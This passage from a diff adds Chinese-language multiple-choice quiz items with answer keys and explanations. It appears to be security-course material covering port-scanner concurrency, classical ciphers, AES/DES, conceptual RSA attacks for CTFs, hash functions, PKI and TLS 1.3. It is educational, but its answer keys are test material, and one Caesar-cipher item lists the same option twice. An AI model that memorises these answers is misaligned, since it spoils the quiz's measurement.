+        "并发可以绕过防火墙"
+      ],
+      "answer": 1,
+      "explanation": "端口扫描是 I/O 密集型任务——大部分时间在等待网络连接或超时。并发允许在等待一个端口时同时扫描其他端口，大幅提升效率。"
+    },
+    {
+      "question": "ThreadPoolExecutor 的 max_workers 参数设置太大会有什么问题？",
+      "options": [
+        "扫描更慢",
+        "创建过多线程会耗尽系统资源（文件描述符、内存），可能被目标封禁",
+        "没有任何问题",
+        "会导致 Python 崩溃"
+      ],
+      "answer": 1,
+      "explanation": "每个线程占用内存和文件描述符。太多线程（如 10000+）可能耗尽系统资源。同时，对目标发送过多并发连接可能触发 IDS/IPS 或被防火墙封禁。"
+    },
+    {
+      "question": "asyncio 相比多线程的优势是什么？",
+      "options": [
+        "可以用更多 CPU 核心",
+        "单线程内管理数千并发连接，开销最小",
+        "语法更简单",
+        "不需要设置超时"
+      ],
+      "answer": 1,
+      "explanation": "asyncio 在单线程内通过事件循环管理大量并发 I/O 操作。每个协程只占几百字节（线程要几 MB），可以轻松处理数万并发连接，是大规模扫描的最佳方案。"
+    },
+    {
+      "question": "多线程编程中，为什么共享数据需要用锁（Lock）保护？",
+      "options": [
+        "加速运算",
+        "防止多个线程同时修改同一数据导致数据丢失或损坏",
+        "Python 要求必须用锁",
+        "锁可以加密数据"
+      ],
+      "answer": 1,
+      "explanation": "当两个线程同时执行 results[port] = \"open\" 时，可能出现一个线程的写入被另一个覆盖。锁确保同一时间只有一个线程访问共享数据，防止竞态条件。"
+    }
+  ],
+  "cryptography": [
+    {
+      "question": "凯撒密码使用偏移量 k=3 加密消息 'HELLO'，加密结果是什么？",
+      "options": [
+        "KHOOR",
+        "HELLO",
+        "KHOOR",
+        "EBIIL"
+      ],
+      "answer": 0,
+      "explanation": "凯撒密码将每个字母向后移动 k 位。H→K, E→H, L→O, L→O, O→R，所以 HELLO 加密为 KHOOR。偏移量 k=3 正是凯撒本人使用的经典参数。"
+    },
+    {
+      "question": "频率分析破解凯撒密码的原理是什么？",
+      "options": [
+        "尝试所有 26 种偏移量逐一比对",
+        "利用密文中字母频率分布与明文语言频率分布相同的特性，找出偏移量",
+        "分析密文中单词长度分布",
+        "利用密钥空间太小的弱点"
+      ],
+      "answer": 1,
+      "explanation": "凯撒密码只是将字母表整体平移，频率分布的形状完全不变。英语中 E 出现最多（约 12.7%），密文中出现最多的字母就对应 E，由此推算偏移量。暴力破解虽然也可行，但频率分析更优雅高效。"
+    },
+    {
+      "question": "单表替换密码的密钥空间为 26! ≈ 4×10^26，为什么仍然可以被频率分析破解？",
+      "options": [
+        "因为 26! 在计算机面前太小了",
+        "因为每个字母始终被替换为同一个密文字母，语言频率特征被完整保留",
+        "因为单表替换没有使用数学运算",
+        "因为密钥分发过程不安全"
+      ],
+      "answer": 1,
+      "explanation": "虽然密钥空间巨大使得暴力破解不可能，但单表替换的结构性弱点在于：每个明文字母始终映射到固定的密文字母。这意味着明文的字母频率统计特征被完整保留在密文中，频率分析可以直接利用。阿拉伯学者 Al-Kindi 在公元 9 世纪就发现了这一点。"
+    },
+    {
+      "question": "凯撒密码的数学表达式 C = (P + k) mod 26 中，mod 26 的作用是什么？",
+      "options": [
+        "增加密钥空间",
+        "让字母表循环，确保加密结果仍在 A-Z 范围内",
+        "提高加密速度",
+        "防止频率分析"
+      ],
+      "answer": 1,
+      "explanation": "mod 26 实现了字母表的'循环'效果。例如 Z（编号25）偏移 3 后为 28，28 mod 26 = 2，即字母 C。没有 mod 26，偏移后的值会超出字母表范围。"
+    },
+    {
+      "question": "ROT13 是凯撒密码的特例（k=13），它的特殊性质是什么？",
+      "options": [
+        "加密后无法解密",
+        "加密和解密使用相同的操作",
+        "密钥空间比凯撒密码更大",
+        "可以抵抗频率分析"
+      ],
+      "answer": 1,
+      "explanation": "英文字母共 26 个，13 恰好是 26 的一半。对任何文本做两次 ROT13（即偏移 13+13=26），等价于偏移 0，恢复原文。所以 ROT13 加密和解密是同一个操作。这不是安全特性，ROT13 没有任何密码学安全性。"
+    },
+    {
+      "question": "仿射密码 C = (a × P + b) mod 26 中，系数 a 必须满足什么条件？",
+      "options": [
+        "a 必须是偶数",
+        "a 必须大于 b",
+        "a 必须与 26 互素（gcd(a, 26) = 1）",
+        "a 必须是素数"
+      ],
+      "answer": 2,
+      "explanation": "a 必须与 26 互素，否则 a 在 mod 26 下没有模逆元。没有模逆元意味着无法唯一解密——多个不同的明文会映射到同一个密文。例如 a=2 时，P=0 和 P=13 都映射到 b，解密时无法区分。"
+    }
+  ],
+  "crypto-01-02": [
+    {
+      "question": "维吉尼亚密码相比凯撒密码的核心改进是什么？",
+      "options": [
+        "使用了更大的字母表",
+        "用关键词对明文不同位置使用不同的偏移量（多表替换）",
+        "增加了密钥长度",
+        "使用了数学运算替代字母替换"
+      ],
+      "answer": 1,
+      "explanation": "维吉尼亚密码的革命性在于'多表替换'——同一个字母在不同位置被加密成不同的密文字母。这使得传统的单字母频率分析完全失效，因为频率被分散到多个密文字母上。"
+    },
+    {
+      "question": "Kasiski 试验破解维吉尼亚密码的第一步是什么？",
+      "options": [
+        "直接暴力尝试所有关键词",
+        "找到密文中的重复片段，计算它们之间的距离，推测密钥长度",
+        "使用频率分析确定密钥字母",
+        "利用字母的 ASCII 编码"
+      ],
+      "answer": 1,
+      "explanation": "Kasiski 试验利用维吉尼亚密码的结构性弱点——密钥循环重复。当明文中出现重复片段且位置差是密钥长度的倍数时，密文中也会出现对应重复。通过分析这些重复片段距离的公因子，可以推测密钥长度。"
+    },
+    {
+      "question": "重合指数（IC）用于破解维吉尼亚密码时，英语文本的 IC 值约为多少？",
+      "options": [
+        "0.0385",
+        "0.0667",
+        "0.5000",
+        "1.0000"
+      ],
+      "answer": 1,
+      "explanation": "英语文本的重合指数约为 0.0667（两个随机选取的字母相同的概率），而完全随机文本的 IC 约为 0.0385。测试不同的密钥长度分组，选 IC 最接近 0.0667 的那个作为密钥长度。"
+    },
+    {
+      "question": "确定维吉尼亚密码的密钥长度后，如何破解每组的密钥字母？",
+      "options": [
+        "对每组密文做频率分析，最高频字母对应明文 E",
+        "对每组尝试暴力破解所有 26 种偏移",
+        "利用 Kasiski 试验继续深入",
+        "使用重合指数进一步细分"
+      ],
+      "answer": 0,
+      "explanation": "确定密钥长度 k 后，将密文按位置 mod k 分成 k 组。每组实际上是被同一个偏移量加密的凯撒密码。对每组做频率分析，找到最高频字母，推算它与 E 的偏移差，就得到了该位置的密钥字母。"
+    },
+    {
+      "question": "一次性密码本（OTP）为什么被称为'理论不可破解'的加密方案？",
+      "options": [
+        "因为它使用了复杂的数学",
+        "因为密钥与明文等长、完全随机、绝不重复，密文不泄露任何信息",
+        "因为密钥太长无法暴力破解",
+        "因为它使用了量子加密"
+      ],
+      "answer": 1,
+      "explanation": "OTP 的三个条件——密钥与明文等长、完全随机、绝不重复——使得每个密文字节可以等概率地对应任何明文。即使拥有无限计算能力，也无法区分哪个是'正确'的明文。但密钥分发问题使其无法大规模应用。"
+    },
+    {
+      "question": "维吉尼亚密码被破解的根本原因是什么？",
+      "options": [
+        "密钥太短",
+        "密钥循环重复使用",
+        "字母表太小",
+        "加密算法太简单"
+      ],
+      "answer": 1,
+      "explanation": "维吉尼亚密码的核心弱点是密钥循环重复。密钥长度有限，对长消息必须重复使用，这就产生了周期性模式。Kasiski 试验和重合指数法都利用了这一周期性。如果密钥不重复（一次性密码本），则理论不可破解。"
+    }
+  ],
+  "crypto-02": [
+    {
+      "question": "DES 的 S-Box 最初被怀疑有后门，后来发现 NSA 参与设计的真正目的是什么？",
+      "options": [
+        "植入后门让 NSA 能解密",
+        "增强加密速度",
+        "抵抗差分密码分析攻击——领先学术界 15 年",
+        "减小密钥长度"
+      ],
+      "answer": 2,
+      "explanation": "DES 的 S-Box 在发布时引发广泛怀疑，因为设计标准没有公开。后来发现 NSA 实际上增强了 S-Box 来抵抗差分密码分析（当时还是机密技术）。学术界直到 1990 年才独立发现差分分析方法，NSA 领先了约 15 年。"
+    },
+    {
+      "question": "DES 的 56 位密钥意味着多少种可能的密钥？它在何时被暴力破解？",
+      "options": [
+        "2^64 种，2010年被破解",
+        "2^56 种（约 7.2×10^16），1999 年在 22 小时内被破解",
+        "2^128 种，至今未被破解",
+        "2^32 种，1990年被破解"
+      ],
+      "answer": 1,
+      "explanation": "DES 使用 56 位有效密钥（64 位中 8 位用于奇偶校验），共 2^56 ≈ 7.2×10^16 种可能。1999 年 Deep Crack 硬件联合 distributed.net 的分布式计算在 22 小时内完成暴力破解，证明了 56 位密钥已不再安全。"
+    },
+    {
+      "question": "AES 每轮执行四个步骤的正确顺序是什么？",
+      "options": [
+        "AddRoundKey → MixColumns → ShiftRows → SubBytes",
+        "SubBytes → ShiftRows → MixColumns → AddRoundKey",
+        "ShiftRows → SubBytes → AddRoundKey → MixColumns",
+        "MixColumns → SubBytes → ShiftRows → AddRoundKey"
+      ],
+      "answer": 1,
+      "explanation": "AES 每轮四步：1) SubBytes（S-Box 非线性字节替换）→ 2) ShiftRows（行循环移位，实现行间扩散）→ 3) MixColumns（GF(2⁸) 有限域列混合，实现列内扩散）→ 4) AddRoundKey（异或轮密钥，注入密钥材料）。"
+    },
+    {
+      "question": "以下哪种 AES 工作模式被认为是最推荐的？为什么？",
+      "options": [
+        "ECB，因为最简单",
+        "CBC，因为广泛使用",
+        "GCM，因为同时提供加密和认证，且性能好",
+        "CTR，因为可以并行处理"
+      ],
+      "answer": 2,
+      "explanation": "GCM（Galois/Counter Mode）结合了 CTR 模式的并行性能和 GMAC 认证。它不需要 padding（避免 padding oracle 攻击），提供认证加密（AEAD），是目前 TLS 和其他协议中最推荐的模式。ECB 永远不应使用，CBC 容易受 padding oracle 攻击。"
+    },
+    {
+      "question": "为什么 ECB 模式被认为是不安全的？",
+      "options": [
+        "因为它太慢",
+        "因为相同的明文块总是产生相同的密文块，泄露数据的模式信息",
+        "因为它需要 IV",
+        "因为它只能加密短消息"
+      ],
+      "answer": 1,
+      "explanation": "ECB 模式对每个块独立加密，相同明文块必然产生相同密文块。著名的例子是加密一张企鹅图片，ECB 模式下仍然能看到企鹅的轮廓。这泄露了数据的结构和模式信息，违反了密码学的基本安全要求。"
+    },
+    {
+      "question": "对称加密面临的核心挑战是什么？这个问题由哪种加密方式解决？",
+      "options": [
+        "速度太慢；由硬件加速解决",
+        "密钥分发——通信双方必须安全地共享同一个密钥；由非对称加密解决",
+        "密钥太短；由更长密钥解决",
+        "算法太复杂；由简化算法解决"
+      ],
+      "answer": 1,
+      "explanation": "对称加密（如 AES）本身非常安全高效，但通信双方必须拥有相同的密钥。在开放互联网上，如何在不安全的通道中安全交换密钥是核心难题。非对称加密（如 RSA、DH）通过公钥/私钥机制解决了密钥分发问题。"
+    }
+  ],
+  "crypto-03": [
+    {
+      "question": "RSA 的安全性建立在什么数学难题之上？",
+      "options": [
+        "离散对数问题",
+        "大整数分解问题——将两个大素数的乘积分解回原始素数极其困难",
+        "椭圆曲线问题",
+        "哈希碰撞问题"
+      ],
+      "answer": 1,
+      "explanation": "RSA 的安全性基于大整数分解难题：两个大素数相乘非常容易（多项式时间），但将乘积分解回原始素数在计算上极其困难（目前没有已知的多项式时间算法）。RSA 的私钥 d 依赖于知道 p 和 q，所以分解 n 就等于破解 RSA。"
+    },
+    {
+      "question": "在 RSA 密钥生成中，欧拉函数 φ(n) = (p-1)(q-1) 的作用是什么？",
+      "options": [
+        "用于加密消息",
+        "用于计算私钥 d，使得 e×d ≡ 1 (mod φ(n))",
+        "用于生成随机数",
+        "用于验证签名"
+      ],
+      "answer": 1,
+      "explanation": "φ(n) 是 RSA 密钥生成的核心。选择公钥指数 e 后，私钥 d 是 e 模 φ(n) 的逆元，即 e×d ≡ 1 (mod φ(n))。这确保了加密和解密操作互为逆运算：m^(ed) ≡ m (mod n)，正确性由欧拉定理保证。"
+    },
+    {
+      "question": "RSA 中为什么必须使用 OAEP 填充，而不是直接加密？",
+      "options": [
+        "因为 OAEP 更快",
+        "因为直接加密是确定性的（同一明文总是产生相同密文），且小消息在小 e 下可被直接开方破解",
+        "因为 OAEP 能压缩消息",
+        "因为直接加密不支持大消息"
+      ],
+      "answer": 1,
+      "explanation": "RSA 直接加密（教科书 RSA）有两个严重问题：1) 确定性——同一明文总是产生相同密文，攻击者可以枚举验证；2) 小消息问题——当 m^e < n 时，密文 c = m^e，直接开 e 次方即可恢复明文。OAEP 引入随机性和结构化填充，解决这些问题。"
+    },
+    {
+      "question": "Diffie-Hellman 密钥交换中，Alice 和 Bob 如何在不安全的通道上协商出共享密钥？",
+      "options": [
+        "Alice 用 RSA 加密密钥发送给 Bob",
+        "双方各自生成临时密钥对，交换公钥后通过 g^(ab) mod p 计算共享秘密",
+        "通过一个可信第三方分发密钥",
+        "使用对称加密传输密钥"
+      ],
+      "answer": 1,
+      "explanation": "DH 的精妙之处在于：Alice 计算 A=g^a mod p，Bob 计算 B=g^b mod p，双方交换 A 和 B（公开信息）。Alice 计算 B^a = g^(ab) mod p，Bob 计算 A^b = g^(ab) mod p，得到相同的共享密钥。窃听者知道 g、p、A、B，但无法计算 g^(ab)（离散对数难题）。"
+    },
+    {
+      "question": "RSA 的实际应用中，为什么不用 RSA 直接加密所有数据？",
+      "options": [
+        "因为 RSA 密钥太短",
+        "因为 RSA 比 AES 慢约 1000 倍，实际只用于密钥交换和数字签名",
+        "因为 RSA 不能加密大文件",
+        "因为 RSA 的密文太长"
+      ],
+      "answer": 1,
+      "explanation": "RSA 的数学运算（模幂运算）非常耗时，比 AES 慢约 1000 倍。实际应用中，RSA 用于：1) 协商对称密钥（如 TLS 握手）；2) 数字签名。然后用快速的 AES 加密实际数据。这种混合方案结合了两者的优势。"
+    },
+    {
+      "question": "目前推荐的 RSA 密钥长度是多少？为什么 512 位不再安全？",
+      "options": [
+        "512 位足够，至今安全",
+        "推荐 2048 位或更高；512 位在 1999 年就被成功分解",
+        "128 位即可",
+        "4096 位以上才行"
+      ],
+      "answer": 1,
+      "explanation": "RSA-512 在 1999 年被成功分解，RSA-768 在 2009 年被分解。目前推荐至少 2048 位（安全到约 2030 年），高安全需求使用 3072 或 4096 位。量子计算机成熟后，所有 RSA 密钥都不安全，需要迁移到后量子算法。"
+    }
+  ],
+  "crypto-03-02": [
+    {
+      "question": "RSA 共模攻击（Common Modulus Attack）的前提条件是什么？",
+      "options": [
+        "两个不同的消息用同一密钥加密",
+        "同一消息用相同的模数 n 但不同的公钥指数 e 加密两次",
+        "两个用户共享相同的私钥",
+        "模数 n 太小"
+      ],
+      "answer": 1,
+      "explanation": "共模攻击的条件：同一明文 m 用相同的 n 但不同的 e₁ 和 e₂ 加密，产生密文 c₁ 和 c₂。通过扩展欧几里得算法找到 s、t 使得 s·e₁ + t·e₂ = 1，然后计算 c₁^s × c₂^t mod n = m。防御方法：不要对同一消息使用相同 n 的不同 e 加密。"
+    },
+    {
+      "question": "Hastad 广播攻击利用了 RSA 的什么弱点？",
+      "options": [
+        "密钥太短",
+        "同一消息用小公钥指数 e（如 e=3）发给多个接收者，用中国剩余定理恢复明文",
+        "私钥 d 太小",
+        "填充方式不安全"
+      ],
+      "answer": 1,
+      "explanation": "当 e=3 且同一消息发给 3 个不同接收者（不同的 n），得到 c₁=m³ mod n₁, c₂=m³ mod n₂, c₃=m³ mod n₃。用中国剩余定理可以计算 m³ mod (n₁n₂n₃)，由于 m³ < n₁n₂n₃，直接开三次方得到 m。防御：使用 OAEP 填充使每次加密不同。"
+    },
+    {
+      "question": "Wiener 攻击针对 RSA 的什么弱点？其核心数学工具是什么？",
+      "options": [
+        "小 e；使用格基约化",
+        "小 d（d < n^(1/4)/3）；使用连分数展开 e/n 恢复 d",
+        "共享模数；使用扩展欧几里得",
+        "弱随机数；使用统计测试"
+      ],
+      "answer": 1,
+      "explanation": "当私钥 d 太小时（d < n^(1/4)/3），e/n 的连分数展开的收敛子（convergents）中包含 k/d。Wiener 攻击遍历这些收敛子，检测哪个是有效的 d。有些开发者为了让解密更快而选择小 d，这正好落入 Wiener 攻击的陷阱。"
+    },
+    {
+      "question": "Fermat 分解法在什么条件下能高效分解 RSA 模数 n？",
+      "options": [
+        "当 n 是偶数时",
+        "当 p 和 q 太接近时（|p-q| 很小），因为 n ≈ a² 且 a = (p+q)/2",
+        "当 e 很小时",
+        "当 d 很大时"
+      ],
+      "answer": 1,
+      "explanation": "Fermat 分解基于 n = a² - b² = (a+b)(a-b)。当 p 和 q 接近时，a = (p+q)/2 接近 √n，从 √n 向上搜索 a，很快就能找到使 a²-n 为完全平方数的 a。防御：生成 RSA 密钥时确保 p 和 q 的差足够大。"
+    },
+    {
+      "question": "面对一道 RSA CTF 题目，首先应该做什么？",
+      "options": [
+        "直接编写 Wiener 攻击代码",
+        "先分析已知参数（n, e, c），检查 n 是否可以被 factordb.com 分解",
+        "尝试所有攻击方法",
+        "检查填充方式"
+      ],
+      "answer": 1,
+      "explanation": "CTF 中的 RSA 攻击决策树第一步永远是检查 n 是否可以被分解。factordb.com 收录了大量已知分解的大整数，很多 CTF 题目的 n 直接可以在上面查到。如果能分解 n，直接计算 d 即可解密，无需任何高级攻击。"
+    },
+    {
+      "question": "Coppersmith 短填充攻击适用于什么场景？其核心数学工具是什么？",
+      "options": [
+        "大 d；使用连分数",
+        "大部分明文已知（如已知消息格式的填充）；使用格基约化（LLL 算法）",
+        "小 e 且单一接收者；使用中国剩余定理",
+        "共享模数；使用扩展欧几里得"
+      ],
+      "answer": 1,
+      "explanation": "当明文的大部分已知时（例如知道填充格式但不知道短消息部分），Coppersmith 方法利用格基约化（LLL 算法）找到多项式的小根，从而恢复未知的明文部分。这在 CTF 中常用于已知消息前缀或后缀的场景。推荐使用 SageMath 的 small_roots() 方法。"
+    }
+  ],
+  "crypto-04": [
+    {
+      "question": "2004 年王小云教授在 CRYPTO 大会上的突破是什么？",
+      "options": [
+        "发明了 SHA-3 算法",
+        "找到了 MD5 的实际碰撞——两个不同输入产生相同的 MD5 哈希值",
+        "破解了 AES 加密",
+        "发明了量子哈希函数"
+      ],
+      "answer": 1,
+      "explanation": "王小云教授使用'消息修改技术'，在普通 PC 上几秒内就能找到 MD5 碰撞。她的攻击不仅针对 MD5，还同时击破了 MD4、HAVAL-128、RIPEMD-128。2005 年她又展示了 SHA-1 的理论弱点，最终促成 Google 在 2017 年完成 SHA-1 的实际碰撞。"
+    },
+    {
+      "question": "密码学哈希函数必须具备的三个安全性质是什么？",
+      "options": [
+        "加密、解密、签名",
+        "抗原像（单向性）、抗第二原像、抗碰撞",
+        "速度快、密钥短、输出短",
+        "可逆性、确定性、唯一性"
+      ],
+      "answer": 1,
+      "explanation": "三个核心性质：1) 抗原像——给定哈希值 h，找不到任何 m 使 hash(m)=h（单向性）；2) 抗第二原像——给定 m₁，找不到 m₂≠m₁ 使 hash(m₁)=hash(m₂)；3) 抗碰撞——找不到任何一对 m₁≠m₂ 使哈希值相同。这三个性质依次增强。"
+    },
+    {
+      "question": "为什么 128 位的 MD5 碰撞攻击复杂度是 2^64 而不是 2^128？",
+      "options": [
+        "因为 MD5 有一半的位是冗余的",
+        "因为生日悖论——在 2^(n/2) 次尝试中高概率找到一对碰撞",
+        "因为王小云找到了捷径",
+        "因为 MD5 的实现有 bug"
+      ],
+      "answer": 1,
+      "explanation": "生日悖论指出：在 23 个人中就有 50% 概率找到两人生日相同（而非需要 365 人）。类似地，对于 n 位哈希值，约 2^(n/2) 次随机尝试就有高概率找到碰撞。MD5 的 128 位输出意味着碰撞安全级别仅为 64 位，远低于直觉预期的 128 位。"
+    },
+    {
+      "question": "SHA-3（Keccak）与 SHA-2 的核心区别是什么？",
+      "options": [
+        "SHA-3 更安全",
+        "SHA-3 更快",
+        "SHA-3 采用完全不同的海绵结构（Sponge），而 SHA-2 使用 Merkle-Damgard 结构",
+        "SHA-3 输出更短"
+      ],
+      "answer": 2,
+      "explanation": "SHA-3 的革命性在于彻底放弃了 Merkle-Damgard 结构（MD5/SHA-1/SHA-2 共享），采用海绵结构（Sponge Construction）。这意味着如果某天 SHA-2 被发现漏洞，SHA-3 因为完全不同的内部设计很可能不受影响。SHA-3 并不比 SHA-2 '更安全'或'更快'，它的价值在于作为战略备份。"
+    },
+    {
+      "question": "Merkle-Damgard 结构（MD5、SHA-1、SHA-2 共享）面临什么特有的攻击？",
+      "options": [
+        "暴力破解",
+        "长度扩展攻击（Length Extension Attack）",
+        "中间人攻击",
+        "重放攻击"
+      ],
+      "answer": 1,
+      "explanation": "Merkle-Damgard 结构的特性使得攻击者知道 hash(m) 后，无需知道 m，就能计算 hash(m || padding || m')——在原始消息后追加数据并得到有效的哈希值。这在使用 H(key || message) 做认证时极其危险。SHA-3 的海绵结构天然免疫此攻击，或者使用 HMAC 代替简单拼接。"
+    },
+    {
+      "question": "Google 的 SHAttered 攻击（2017）证明了什么？",
+      "options": [
+        "SHA-256 被破解",
+        "SHA-1 的第一个实际碰撞——两个不同 PDF 产生相同 SHA-1 哈希值",
+        "MD5 比 SHA-1 更安全",
+        "所有哈希函数都不安全"
+      ],
+      "answer": 1,
+      "explanation": "2017 年 Google 完成了第一个 SHA-1 实际碰撞（SHAttered），制造了两个内容完全不同但 SHA-1 哈希值相同的 PDF 文件。这证实了王小云 2005 年的理论分析。此后所有主流浏览器停止信任 SHA-1 签名的证书，SHA-1 正式退出历史舞台。"
+    }
+  ],
+  "crypto-04-02": [
+    {
+      "question": "为什么直接用 SHA-256 哈希密码（不加盐）是不安全的？",
+      "options": [
+        "因为 SHA-256 已被破解",
+        "因为攻击者可以使用预计算的彩虹表瞬间反查原始密码",
+        "因为 SHA-256 太慢",
+        "因为密码太短无法哈希"
+      ],
+      "answer": 1,
+      "explanation": "彩虹表是预先计算的'明文→哈希'映射数据库。如果密码存储只用了简单的 SHA-256，常见密码（如 '123456'、'password'）的哈希值早已收录在彩虹表中。攻击者获得哈希数据库后，只需查表即可瞬间恢复大部分用户的密码。2012 年 LinkedIn 泄露事件就是典型案例。"
+    },
+    {
+      "question": "bcrypt 比 SHA-256 更适合密码存储的核心原因是什么？",
+      "options": [
+        "bcrypt 输出的哈希更长",
+        "bcrypt 故意设计得很慢（可调工作因子），且内存访问密集，有效抵抗 GPU 并行暴力破解",
+        "bcrypt 使用了更复杂的数学",
+        "bcrypt 是加密算法不是哈希"
+      ],
+      "answer": 1,
+      "explanation": "bcrypt 使用 Eksblowfish 密钥编排，每次哈希需要大量内存访问（抗 GPU/ASIC 并行），且工作因子（cost factor）可调——随着硬件进步可以增大计算成本。SHA-256 设计目标是快速，在现代 GPU 上每秒可计算数十亿次，不适合密码存储。"
+    },
+    {
+      "question": "HMAC 如何同时保证消息的完整性和来源认证？",
+      "options": [
+        "通过对消息加密",
+        "通过共享密钥参与哈希计算——只有持有密钥的人能生成和验证有效 HMAC",
+        "通过数字签名",
+        "通过对消息压缩"
+      ],
+      "answer": 1,
+      "explanation": "HMAC = H((K⊕opad) || H((K⊕ipad) || m))。发送方和接收方共享密钥 K。发送方计算 HMAC 附加到消息上；接收方用相同密钥重新计算 HMAC 并比对。攻击者不知道密钥，篡改消息后无法生成有效的 HMAC。这同时验证了完整性（消息未被篡改）和来源（只有密钥持有者能生成有效 HMAC）。"
+    },
+    {
+      "question": "Merkle 树在区块链中的核心作用是什么？",
+      "options": [
+        "加密交易数据",
+        "将所有交易哈希汇聚成根哈希写入区块头，轻客户端只需 Merkle Proof 即可验证交易",
+        "生成新区块",
+        "验证用户身份"
+      ],
+      "answer": 1,
+      "explanation": "比特币每个区块包含数千笔交易。Merkle 树将所有交易哈希两两配对、层层向上汇聚成唯一的根哈希（Root Hash），写入区块头。轻客户端（SPV 节点）只需下载区块头和约 1KB 的 Merkle Proof，就能验证某笔交易是否被包含，无需下载完整区块。"
+    },
+    {
+      "question": "Argon2 作为现代密码哈希算法的核心优势是什么？",
+      "options": [
+        "输出最长",
+        "速度最快",
+        "内存硬（Memory-hard）——计算时需要占用大量内存，使 ASIC/GPU 攻击成本极高",
+        "密钥最短"
+      ],
+      "answer": 2,
+      "explanation": "Argon2 赢得 2015 年密码哈希竞赛，核心优势是'内存硬'特性。计算时需要分配大量内存（如 64MB），使得并行攻击的硬件成本极高——每个并行单元都需要独立的大内存。这比仅'计算慢'的 bcrypt 更有效地抵抗了专用硬件攻击。"
+    },
+    {
+      "question": "HKDF（HMAC-based Key Derivation Function）的两个阶段分别是什么？",
+      "options": [
+        "加密和解密",
+        "提取（Extract）和扩展（Expand）——从密钥材料中安全派生多个高质量密钥",
+        "签名和验证",
+        "压缩和解压"
+      ],
+      "answer": 1,
+      "explanation": "HKDF 分两阶段：1) Extract——用盐和 HKDF-Extract 将低熵输入浓缩为固定长度的伪随机密钥（PRK）；2) Expand——用 HKDF-Expand 从 PRK 派生任意长度和数量的密钥材料。TLS 1.3 用它从 DH 共享秘密派生所有会话密钥。"
+    }
+  ],
+  "crypto-05": [
+    {
+      "question": "数字签名提供的三个安全保证是什么？",
+      "options": [
+        "加密、解密、哈希",
+        "认证性（证明身份）、完整性（检测篡改）、不可否认性（不能抵赖）",
+        "速度、安全、兼容",
+        "机密性、可用性、完整性"
+      ],
+      "answer": 1,
+      "explanation": "数字签名的三重保证：1) 认证性——只有私钥持有者能生成有效签名；2) 完整性——签名绑定消息哈希，任何篡改都会导致验证失败；3) 不可否认性——签名者不能否认自己签过的消息（因为只有他有私钥）。注意：签名不提供机密性——消息本身可以是公开的。"
+    },
+    {
+      "question": "RSA 签名和 RSA 加密的区别是什么？",
+      "options": [
+        "没有区别",
+        "加密是'公钥加密、私钥解密'；签名是'私钥签名、公钥验证'",
+        "签名比加密更安全",
+        "加密比签名更快"
+      ],
+      "answer": 1,
+      "explanation": "RSA 加密：发送方用接收方的公钥加密，接收方用自己的私钥解密（保护机密性）。RSA 签名：签名方用自己的私钥对消息哈希签名，验证方用签名方的公钥验证（证明身份和完整性）。操作方向相反，安全目标也不同。"
+    },
+    {
+      "question": "ECDSA 相比 RSA 签名的主要优势是什么？",
+      "options": [
+        "ECDSA 更安全",
+        "ECDSA 用更短的密钥达到同等安全级别（256位 ECDSA ≈ 3072位 RSA），签名更小、速度更快",
+        "ECDSA 不需要哈希函数",
+        "ECDSA 可以加密数据"
+      ],
+      "answer": 1,
+      "explanation": "椭圆曲线密码学的优势在于：256 位的 ECDSA（P-256 曲线）提供 128 位安全级别，而 RSA 需要 3072 位才能达到同等安全。更短的密钥意味着更小的签名、更快的计算、更低的存储和带宽开销。这使 ECDSA 在移动设备和 IoT 场景中特别有优势。"
+    },
+    {
+      "question": "X.509 证书在 PKI 体系中的核心作用是什么？",
+      "options": [
+        "加密数据传输",
+        "将公钥与身份绑定，由可信的 CA 签名背书，解决'这个公钥属于谁'的问题",
+        "存储密码",
+        "验证文件完整性"
+      ],
+      "answer": 1,
+      "explanation": "数字签名只能证明'这条消息由某个私钥签名'，但无法证明'这个公钥属于声称的那个人'。攻击者可以替换公钥实施中间人攻击。X.509 证书由受信任的 CA 签发，将域名/身份与公钥绑定。浏览器通过验证证书链来确认服务器身份。"
+    },
+    {
+      "question": "Let's Encrypt 使用什么协议实现自动化证书签发？",
+      "options": [
+        "SSL/TLS",
+        "ACME（Automatic Certificate Management Environment）协议",
+        "HTTP/2",
+        "SMTP"
+      ],
+      "answer": 1,
+      "explanation": "ACME 协议自动完成证书签发的全流程：1) 客户端生成密钥对；2) 向 CA 申请证书；3) CA 发出挑战（如 HTTP-01：在特定 URL 放置特定内容）；4) 客户端完成挑战证明域名控制权；5) CA 签发证书。全程自动化，证书有效期 90 天，自动续期。"
+    },
+    {
+      "question": "2011 年 DigiNotar 事件暴露了 PKI 体系的什么根本弱点？",
+      "options": [
+        "加密算法太弱",
+        "CA 本身可能被入侵，攻击者利用 CA 权限为任意域名签发伪造证书",
+        "证书格式有漏洞",
+        "浏览器不支持证书验证"
+      ],
+      "answer": 1,
+      "explanation": "DigiNotar 被黑客入侵后，攻击者利用其 CA 权限为 google.com 等域名伪造了 247 个证书。因为浏览器预装了 DigiNotar 的根证书，这些伪造证书被自动信任。事件暴露了 PKI 的根本问题：预装的约 150 个根 CA 中任何一个被攻破，整个信任链就崩塌。这推动了证书透明（CT）的发展。"
+    }
+  ],
+  "crypto-06": [
+    {
+      "question": "TLS 1.3 相比 TLS 1.2 最重要的设计变化是什么？",
+      "options": [
+        "增加了更多加密算法选项",
+        "做减法——删除所有不安全的算法和特性，只保留最优选择，强制前向保密",
+        "增加了握手往返次数以提高安全性",
+        "改用了对称加密"
+      ],
+      "answer": 1,
+      "explanation": "TLS 1.3 是一次彻底的'减法革命'：移除了 RSA 密钥交换（无前向保密）、CBC 模式、RC4、3DES、MD5、SHA-1、重协商、压缩等所有有安全隐患的组件。只保留 AEAD 加密（AES-GCM, ChaCha20-Poly1305）和临时密钥交换（ECDHE/DHE），强制前向保密。"
+    },
+    {
+      "question": "TLS 1.3 握手只需 1-RTT（一个往返），而 TLS 1.2 需要 2-RTT。关键改进是什么？",
+      "options": [
+        "减少了证书验证步骤",
+        "客户端在 ClientHello 中就发送了 ECDHE 公钥（key_share），服务器可在第一个响应中完成密钥协商",
+        "去掉了加密步骤",
+        "使用了更快的哈希函数"
+      ],
+      "answer": 1,
+      "explanation": "TLS 1.2 中客户端先发送支持的算法列表，服务器选择后再进行密钥交换（需要额外一轮）。TLS 1.3 让客户端在第一个包中就猜测服务器可能接受的密钥交换参数并发送 key_share，服务器选择一个即可立即计算共享密钥。这使得握手延迟减半。"
+    },
+    {
+      "question": "前向保密（Forward Secrecy）保护的是什么？",
+      "options": [
+        "防止中间人攻击",
+        "保护历史通信——即使服务器长期私钥将来泄露，过去的加密流量仍然无法被解密",
+        "加速握手过程",
+        "防止重放攻击"
+      ],
